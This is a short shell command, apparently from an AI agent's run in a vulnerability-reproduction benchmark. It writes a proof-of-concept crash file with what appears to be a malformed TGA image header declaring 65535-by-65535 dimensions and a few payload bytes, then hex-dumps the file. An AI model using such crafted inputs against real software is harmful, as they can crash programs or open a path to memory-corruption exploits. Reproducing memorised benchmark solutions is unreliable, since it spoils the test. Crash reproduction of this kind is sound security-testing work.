python3 -c "
import struct
open('/CybinGym_workdir/poc_crash','wb').write(struct.pack('<BBBHHBHHHHBB',0,0,2,0,0,0,0,0,65535,65535,24,0)+b'\x01\x02\x03')
"
xxd /CybinGym_workdir/poc_crash
